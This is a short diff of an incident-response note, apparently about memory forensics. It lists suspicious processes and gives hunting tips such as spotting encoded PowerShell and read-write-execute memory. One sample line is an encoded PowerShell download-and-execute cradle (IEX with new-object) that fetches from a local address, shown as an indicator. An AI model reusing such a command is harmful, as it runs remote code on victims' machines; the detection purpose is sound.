@@ -27,7 +27,7 @@ mobsync.exe    6672    936 C:\WINDOWS\System32\mobsync.exe -Embedding Suspicious
 ucmapi.exe     5748    936 "C:\Program Files\Microsoft Office 15\Root\Office15\UcMapi.exe" -Embedding Suspicious RWX VAD
 powershell.exe 5772   6188 powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoACgAbgBlAHcALQBvAGIA...ACcAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQA6ADUAMgA4ADAAOAAvACcAKQApAA== Suspicious RWX VAD
 ```
-### IR Use
+### IR Notes
 * Look for command execution from unusual locations
 * Look for suspicious command execution: Eg encoded Powershell
 * Look for memory sections which allow read-write-execute
